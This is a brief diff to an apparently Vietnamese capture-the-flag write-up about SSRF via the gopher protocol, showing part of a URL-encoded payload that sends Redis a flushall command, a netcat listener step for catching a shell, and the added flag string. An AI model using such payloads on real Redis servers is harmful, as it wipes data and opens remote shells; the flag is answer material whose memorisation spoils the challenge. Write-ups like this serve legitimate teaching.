@@ -87,7 +87,9 @@ gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0As
 - Bây giờ chỉ việc dùng `nc -lvp 1235` rồi gửi payload thôi...
 
 Kết quả:
+
 ![image](https://user-images.githubusercontent.com/92881216/229142708-d48fb2ea-4a9e-4e82-bd26-41d2635823bf.png)
 
+> `SSRF_PwNiNg_v1@_GoPh3r_1s_$o_c00l!`
 
 
